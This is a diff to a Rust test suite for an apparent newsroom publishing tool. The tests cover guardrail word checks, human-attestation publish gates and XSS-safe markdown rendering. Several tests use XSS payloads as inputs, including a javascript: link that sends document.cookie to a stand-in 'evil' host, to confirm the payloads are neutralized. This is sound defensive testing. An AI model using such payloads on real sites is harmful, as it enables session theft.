@@ -209,27 +209,44 @@ mod tests {
             updated_at: Utc::now().to_rfc3339(),
         }).unwrap();
 
+        // DEFAULT is warn-only: an accusatory term without a citation raises a
+        // WARNING and is_clean stays true (nothing blocks unless the editor marks
+        // a word blocking).
         let report = run_guardrails_check(&conn, draft_id).unwrap();
-        assert!(!report.is_clean);
-
-        let has_accusatory_err = report
-            .issues
-            .iter()
-            .any(|i| i.category == "Accusatory Language" && i.severity == "error");
-        let has_citation_warn = report
-            .issues
-            .iter()
-            .any(|i| i.category == "Citation Coverage" && i.severity == "warning");
         assert!(
-            has_accusatory_err,
-            "Should have failed on accusatory term without citation"
+            report.is_clean,
+            "default config must be warn-only (no errors)"
         );
         assert!(
-            has_citation_warn,
-            "Should have warned on paragraph missing citation link"
+            report
+                .issues
+                .iter()
+                .any(|i| i.category == "Accusatory Language" && i.severity == "warning"),
+            "accusatory term should warn by default"
+        );
+        assert!(
+            report
+                .issues
+                .iter()
+                .any(|i| i.category == "Citation Coverage" && i.severity == "warning"),
+            "missing-citation paragraph should warn"
         );
 
-        // Legal naming presumption of innocence warning test
+        // Editor marks "corrupt" blocking => the same draft now ERRORS.
+        let mut cfg = crate::core::guardrails::load_guardrail_config(&conn);
+        cfg.blocking = vec!["corrupt".to_string()];
+        crate::core::guardrails::save_guardrail_config(&conn, &cfg).unwrap();
+        let report_b = run_guardrails_check(&conn, draft_id).unwrap();
+        assert!(!report_b.is_clean, "a blocking word must produce an error");
+        assert!(
+            report_b
+                .issues
+                .iter()
+                .any(|i| i.category == "Accusatory Language" && i.severity == "error"),
+            "marked-blocking accusatory term should error"
+        );
+
+        // Legal-naming (presumption of innocence): charge words without "alleged".
         let draft_id2 = insert_draft(
             &conn,
             &Draft {
@@ -249,15 +266,27 @@ mod tests {
         )
         .unwrap();
 
+        // With only "corrupt" blocking, legal-naming WARNS by default.
         let report2 = run_guardrails_check(&conn, draft_id2).unwrap();
-        assert!(!report2.is_clean);
-        let has_presumption_err = report2
-            .issues
-            .iter()
-            .any(|i| i.category == "Legal Naming" && i.severity == "error");
         assert!(
-            has_presumption_err,
-            "Should trigger error due to missing 'alleged' modifier"
+            report2
+                .issues
+                .iter()
+                .any(|i| i.category == "Legal Naming" && i.severity == "warning"),
+            "legal-naming should warn by default"
+        );
+
+        // Editor marks "arrested" blocking => legal-naming ERRORS on missing 'alleged'.
+        cfg.blocking = vec!["arrested".to_string()];
+        crate::core::guardrails::save_guardrail_config(&conn, &cfg).unwrap();
+        let report2b = run_guardrails_check(&conn, draft_id2).unwrap();
+        assert!(!report2b.is_clean);
+        assert!(
+            report2b
+                .issues
+                .iter()
+                .any(|i| i.category == "Legal Naming" && i.severity == "error"),
+            "marked-blocking charge word should error on missing 'alleged'"
         );
     }
 
@@ -425,6 +454,9 @@ mod tests {
             updated_at: Utc::now().to_rfc3339(),
         }).unwrap();
 
+        // RE-AUDIT M1: the publish sink now requires a recorded human attestation.
+        crate::core::db::attest_draft(&conn, draft_id, "Test Editor").unwrap();
+
         let profile_json = r#"{"site_title": "Local Observer", "site_subtitle": "Evidence first", "about_text": "About Observer", "ethics_text": "Ethics", "how_we_report_text": "How We Report"}"#;
 
         // Compile
@@ -548,6 +580,9 @@ mod tests {
             },
         )
         .unwrap();
+
+        // RE-AUDIT M1: the publish sink requires a recorded human attestation.
+        crate::core::db::attest_draft(&conn, draft_id, "Test Editor").unwrap();
 
         crate::core::db::insert_published_post(
             &conn,
@@ -2133,5 +2168,388 @@ mod tests {
         // Negative case: prose with no dollar amounts and no capitalized
         // org-suffix phrase yields nothing (lowercase "council" must not match).
         assert!(extract_entities("the council met to discuss the budget at city hall.").is_empty());
+    }
+
+    // ===== Editorial trust boundary (GG-B1/B2/C1 + re-audit M1/M5/NEW-3/NEW-4) =====
+
+    // GG-B1: render_markdown must neutralize dangerous URI schemes on markdown
+    // links/images while preserving safe / relative / fragment / evidence dests.
+    #[test]
+    fn test_render_markdown_neutralizes_dangerous_uri_schemes() {
+        use crate::core::compiler::render_markdown;
+        for md in [
+            "[click](javascript:alert(1))",
+            "[c](JAVASCRIPT:alert(1))",
+            "![x](data:text/html;base64,PHNjcmlwdD4=)",
+            "[v](vbscript:msgbox(1))",
+        ] {
+            let out = render_markdown(md).to_lowercase();
+            assert!(
+                !out.contains("href=\"javascript:"),
+                "javascript href survived: {md} -> {out}"
+            );
+            assert!(
+                !out.contains("src=\"javascript:"),
+                "javascript src survived: {md} -> {out}"
+            );
+            assert!(
+                !out.contains("href=\"data:"),
+                "data href survived: {md} -> {out}"
+            );
+            assert!(
+                !out.contains("src=\"data:"),
+                "data src survived: {md} -> {out}"
+            );
+            assert!(
+                !out.contains("vbscript:"),
+                "vbscript survived: {md} -> {out}"
+            );
+        }
+        let safe = render_markdown(
+            "[a](https://example.gov) [b](mailto:x@example.gov) [c](evidence:42) [d](../about.html) [e](#s)",
+        );
+        assert!(
+            safe.contains("href=\"https://example.gov\""),
+            "https stripped: {safe}"
+        );
+        assert!(
+            safe.contains("href=\"mailto:x@example.gov\""),
+            "mailto stripped: {safe}"
+        );
+        assert!(
+            safe.contains("href=\"evidence:42\""),
+            "evidence stripped: {safe}"
+        );
+        assert!(
+            safe.contains("href=\"../about.html\""),
+            "relative stripped: {safe}"
+        );
+        assert!(safe.contains("href=\"#s\""), "fragment stripped: {safe}");
+    }
+
+    // GG-B1 + GG-C1: a javascript: markdown link in a draft body must not reach the
+    // compiled site; every page carries the CSP and the reader AI-disclosure.
+    #[test]
+    fn test_compiled_site_blocks_markdown_xss_csp_and_discloses_ai() {
+        let conn = init_db("file:test_compiled_site_xss?mode=memory&cache=shared").unwrap();
+        let temp_dir = tempdir().unwrap();
+        let draft_id = insert_draft(
+            &conn,
+            &Draft {
+                id: None,
+                lead_id: None,
+                format: "story".to_string(),
+                title: "Safe Title".to_string(),
+                content: "Read [the report](javascript:fetch('//evil/'+document.cookie)) now."
+                    .to_string(),
+                status: "published".to_string(),
+                verification_checklist: "[]".to_string(),
+                missing_evidence_notes: None,
+                correction_note: None,
+                created_at: Utc::now().to_rfc3339(),
+                updated_at: Utc::now().to_rfc3339(),
+            },
+        )
+        .unwrap();
+        crate::core::db::attest_draft(&conn, draft_id, "Test Editor").unwrap();
+
+        compile_static_site(&conn, temp_dir.path().to_str().unwrap(), "{}").unwrap();
+        let post =
+            std::fs::read_to_string(temp_dir.path().join(format!("stories/{}.html", draft_id)))
+                .unwrap();
+        let lower = post.to_lowercase();
+        assert!(
+            !lower.contains("href=\"javascript:"),
+            "javascript href reached post: {post}"
+        );
+        assert!(post.contains("the report"), "link text missing");
+        assert!(
+            post.contains("Content-Security-Policy"),
+            "CSP missing from post"
+        );
+        assert!(
+            post.contains("script-src 'none'"),
+            "CSP script-src 'none' missing"
+        );
+        assert!(
+            post.contains("ai-disclosure"),
+            "AI disclosure missing from post"
+        );
+        let index = std::fs::read_to_string(temp_dir.path().join("index.html")).unwrap();
+        assert!(
+            index.contains("Content-Security-Policy"),
+            "CSP missing from index"
+        );
+        assert!(
+            index.contains("ai-disclosure"),
+            "AI disclosure missing from index"
+        );
+    }
+
+    // GG-B2 + GG-C1 + M1: the compile sink requires attestation AND (clean OR
+    // overridden) for EVERY publishable draft, via any path.
+    #[test]
+    fn test_compile_enforces_attestation_and_guardrail_gate() {
+        let conn = init_db("file:test_compile_gate?mode=memory&cache=shared").unwrap();
+        let temp_dir = tempdir().unwrap();
+
+        let clean_id = insert_draft(
+            &conn,
+            &Draft {
+                id: None,
+                lead_id: None,
+                format: "story".to_string(),
+                title: "Budget Notice".to_string(),
+                content: "The council adopted the annual budget (evidence:1).".to_string(),
+                status: "published".to_string(),
+                verification_checklist: "[]".to_string(),
+                missing_evidence_notes: None,
+                correction_note: None,
+                created_at: Utc::now().to_rfc3339(),
+                updated_at: Utc::now().to_rfc3339(),
+            },
+        )
+        .unwrap();
+        let clean_path = temp_dir.path().join(format!("stories/{}.html", clean_id));
+
+        // (a) Un-attested => skipped.
+        compile_static_site(&conn, temp_dir.path().to_str().unwrap(), "{}").unwrap();
+        assert!(!clean_path.exists(), "un-attested draft must not publish");
+
+        // (b) Attested + clean => publishes.
+        crate::core::db::attest_draft(&conn, clean_id, "Editor").unwrap();
+        compile_static_site(&conn, temp_dir.path().to_str().unwrap(), "{}").unwrap();
+        assert!(clean_path.exists(), "attested clean draft should publish");
+
+        // Unclean draft with charge words marked blocking, attested.
+        let mut cfg = crate::core::guardrails::load_guardrail_config(&conn);
+        cfg.blocking = vec!["fraud".to_string(), "embezzle".to_string()];
+        crate::core::guardrails::save_guardrail_config(&conn, &cfg).unwrap();
+        let dirty_id = insert_draft(
+            &conn,
+            &Draft {
+                id: None,
+                lead_id: None,
+                format: "story".to_string(),
+                title: "Allegation".to_string(),
+                content: "The mayor committed fraud and embezzled funds.".to_string(),
+                status: "published".to_string(),
+                verification_checklist: "[]".to_string(),
+                missing_evidence_notes: None,
+                correction_note: None,
+                created_at: Utc::now().to_rfc3339(),
+                updated_at: Utc::now().to_rfc3339(),
+            },
+        )
+        .unwrap();
+        crate::core::db::attest_draft(&conn, dirty_id, "Editor").unwrap();
+        let dirty_path = temp_dir.path().join(format!("stories/{}.html", dirty_id));
+
+        // (c) Attested but unclean + no override => skipped.
+        compile_static_site(&conn, temp_dir.path().to_str().unwrap(), "{}").unwrap();
+        assert!(
+            !dirty_path.exists(),
+            "attested-but-unclean draft must not publish without override"
+        );
+
+        // (d) With a logged override => publishes.
+        crate::core::db::record_guardrail_override(&conn, dirty_id, "Verified against indictment.")
+            .unwrap();
+        compile_static_site(&conn, temp_dir.path().to_str().unwrap(), "{}").unwrap();
+        assert!(dirty_path.exists(), "overridden draft should publish");
+    }
+
+    // GG-C1: attestation/override gate columns round-trip (proves migration 0008).
+    #[test]
+    fn test_attest_and_override_gate_columns() {
+        let conn = init_db("file:test_attest_gate?mode=memory&cache=shared").unwrap();
+        let id = insert_draft(
+            &conn,
+            &Draft {
+                id: None,
+                lead_id: None,
+                format: "brief".to_string(),
+                title: "Notice".to_string(),
+                content: "The council adopted the minutes.".to_string(),
+                status: "draft_generated".to_string(),
+                verification_checklist: "[]".to_string(),
+                missing_evidence_notes: None,
+                correction_note: None,
+                created_at: Utc::now().to_rfc3339(),
+                updated_at: Utc::now().to_rfc3339(),
+            },
+        )
+        .unwrap();
+        let (att, ov) = crate::core::db::get_draft_publish_gate(&conn, id).unwrap();
+        assert!(att.is_none() && ov.is_none(), "new draft has no gate state");
+        crate::core::db::attest_draft(&conn, id, "Jane Editor").unwrap();
+        crate::core::db::record_guardrail_override(&conn, id, "documented").unwrap();
+        let (att2, ov2) = crate::core::db::get_draft_publish_gate(&conn, id).unwrap();
+        assert!(
+            !att2.unwrap().trim().is_empty(),
+            "attested_at should be set"
+        );
+        assert_eq!(ov2.unwrap(), "documented");
+    }
+
+    // Editable guardrails: defaults are warn-only, round-trip works, and a blocking
+    // word not in either list is dropped on save (RE-AUDIT NEW-4).
+    #[test]
+    fn test_guardrail_config_round_trip_and_blocking_validation() {
+        let mut conn = Connection::open_in_memory().unwrap();
+        run_migrations(&mut conn).unwrap();
+        let def = crate::core::guardrails::load_guardrail_config(&conn);
+        assert!(
+            !def.accusatory.is_empty(),
+            "default accusatory list non-empty"
+        );
+        assert!(def.blocking.is_empty(), "default must be warn-only");
+        let cfg = crate::core::guardrails::GuardrailConfig {
+            accusatory: vec!["bribe".to_string()],
+            legal: vec!["indicted".to_string()],
+            blocking: vec!["bribe".to_string(), "not-a-listed-word".to_string()],
+        };
+        crate::core::guardrails::save_guardrail_config(&conn, &cfg).unwrap();
+        let loaded = crate::core::guardrails::load_guardrail_config(&conn);
+        assert_eq!(loaded.accusatory, vec!["bribe".to_string()]);
+        assert_eq!(
+            loaded.blocking,
+            vec!["bribe".to_string()],
+            "unlisted blocking word must be dropped"
+        );
+    }
+
+    // RE-AUDIT M5/M1: directly test the publish-gate function (attestation,
+    // guardrail block, override, empty-override rejection, non-publish bypass,
+    // and that 'corrected' is gated).
+    #[test]
+    fn test_enforce_publish_gate_directly() {
+        use crate::tauri_cmds::enforce_publish_gate;
+        let conn = init_db("file:test_enforce_gate?mode=memory&cache=shared").unwrap();
+        let id = insert_draft(
+            &conn,
+            &Draft {
+                id: None,
+                lead_id: None,
+                format: "story".to_string(),
+                title: "T".to_string(),
+                content: "The council adopted the budget (evidence:1).".to_string(),
+                status: "draft_generated".to_string(),
+                verification_checklist: "[]".to_string(),
+                missing_evidence_notes: None,
+                correction_note: None,
+                created_at: Utc::now().to_rfc3339(),
+                updated_at: Utc::now().to_rfc3339(),
+            },
+        )
+        .unwrap();
+
+        // Non-publish transitions always pass without attestation.
+        assert!(enforce_publish_gate(&conn, id, "hold", None).is_ok());
+        assert!(enforce_publish_gate(&conn, id, "killed", None).is_ok());
+
+        // Publish without attestation => ATTESTATION_REQUIRED; 'corrected' gated too (M1).
+        assert!(enforce_publish_gate(&conn, id, "ready_to_publish", None)
+            .unwrap_err()
+            .starts_with("ATTESTATION_REQUIRED"));
+        assert!(enforce_publish_gate(&conn, id, "corrected", None)
+            .unwrap_err()
+            .starts_with("ATTESTATION_REQUIRED"));
+
+        // Attest => clean draft passes.
+        crate::core::db::attest_draft(&conn, id, "Editor").unwrap();
+        assert!(enforce_publish_gate(&conn, id, "ready_to_publish", None).is_ok());
+
+        // Unclean (blocking) draft: blocked without override, with whitespace
+        // override, and passes only with a real override (which is recorded).
+        let mut cfg = crate::core::guardrails::load_guardrail_config(&conn);
+        cfg.blocking = vec!["fraud".to_string()];
+        crate::core::guardrails::save_guardrail_config(&conn, &cfg).unwrap();
+        let bad = insert_draft(
+            &conn,
+            &Draft {
+                id: None,
+                lead_id: None,
+                format: "story".to_string(),
+                title: "B".to_string(),
+                content: "The official committed fraud.".to_string(),
+                status: "draft_generated".to_string(),
+                verification_checklist: "[]".to_string(),
+                missing_evidence_notes: None,
+                correction_note: None,
+                created_at: Utc::now().to_rfc3339(),
+                updated_at: Utc::now().to_rfc3339(),
+            },
+        )
+        .unwrap();
+        crate::core::db::attest_draft(&conn, bad, "Editor").unwrap();
+        assert!(enforce_publish_gate(&conn, bad, "published", None)
+            .unwrap_err()
+            .starts_with("GUARDRAILS_BLOCKED"));
+        assert!(
+            enforce_publish_gate(&conn, bad, "published", Some("   "))
+                .unwrap_err()
+                .starts_with("GUARDRAILS_BLOCKED"),
+            "whitespace override must not count"
+        );
+        assert!(enforce_publish_gate(&conn, bad, "published", Some("Verified.")).is_ok());
+        let (_a, ov) = crate::core::db::get_draft_publish_gate(&conn, bad).unwrap();
+        assert_eq!(ov.unwrap(), "Verified.");
+    }
+
+    // RE-AUDIT NEW-3: whole-word/inflection matching avoids substring false
+    // positives but still catches real inflections.
+    #[test]
+    fn test_guardrail_word_boundary_avoids_false_positives() {
+        let conn = init_db("file:test_word_boundary?mode=memory&cache=shared").unwrap();
+        let benign = insert_draft(
+            &conn,
+            &Draft {
+                id: None,
+                lead_id: None,
+                format: "story".to_string(),
+                title: "T".to_string(),
+                content: "The surcharged invoice for scampi at the theftproof vault was filed."
+                    .to_string(),
+                status: "draft_generated".to_string(),
+                verification_checklist: "[]".to_string(),
+                missing_evidence_notes: None,
+                correction_note: None,
+                created_at: Utc::now().to_rfc3339(),
+                updated_at: Utc::now().to_rfc3339(),
+            },
+        )
+        .unwrap();
+        let r = run_guardrails_check(&conn, benign).unwrap();
+        assert!(
+            !r.issues.iter().any(|i| i.category == "Accusatory Language"),
+            "must not fire on surcharged/scampi/theftproof: {:?}",
+            r.issues
+        );
+
+        let inflected = insert_draft(
+            &conn,
+            &Draft {
+                id: None,
+                lead_id: None,
+                format: "story".to_string(),
+                title: "T".to_string(),
+                content: "The treasurer embezzled the funds.".to_string(),
+                status: "draft_generated".to_string(),
+                verification_checklist: "[]".to_string(),
+                missing_evidence_notes: None,
+                correction_note: None,
+                created_at: Utc::now().to_rfc3339(),
+                updated_at: Utc::now().to_rfc3339(),
+            },
+        )
+        .unwrap();
+        let r2 = run_guardrails_check(&conn, inflected).unwrap();
+        assert!(
+            r2.issues
+                .iter()
+                .any(|i| i.category == "Accusatory Language"),
+            "inflected 'embezzled' should still match 'embezzle'"
+        );
     }
 }
